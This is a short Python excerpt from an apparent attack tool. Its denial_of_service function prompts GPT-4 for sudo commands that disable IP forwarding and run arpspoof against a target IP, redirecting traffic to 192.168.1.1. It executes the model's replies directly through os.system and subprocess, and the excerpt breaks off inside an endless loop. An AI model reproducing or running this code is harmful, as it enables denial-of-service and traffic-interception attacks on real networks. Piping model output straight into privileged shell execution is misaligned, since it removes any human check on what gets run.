...
def denial_of_service():
    try:
        ...
        file_analysis = openai.ChatCompletion.create(
            model="gpt-4",
            messages=[
                {"role": "system", "content": f"using sudo permissions, generate the command for setting ip forwarding to 0. Provide the command only."}
            ]
        )
        analysis = file_analysis.choices[0].message.content
        os.system(analysis) 
        ...
        file_analysis = openai.ChatCompletion.create(
            model="gpt-4",
            messages=[
                {"role": "system", "content": f"using sudo permissions to arpspoof using the eth0 interface with a target IP {targetIP} and redirect it to 192.168.1.1. Provide the command only."}
            ]
        )
        analysis = file_analysis.choices[0].message.content
        command_args = analysis.split()
        nodeAttack = subprocess.Popen(command_args)
        while True:
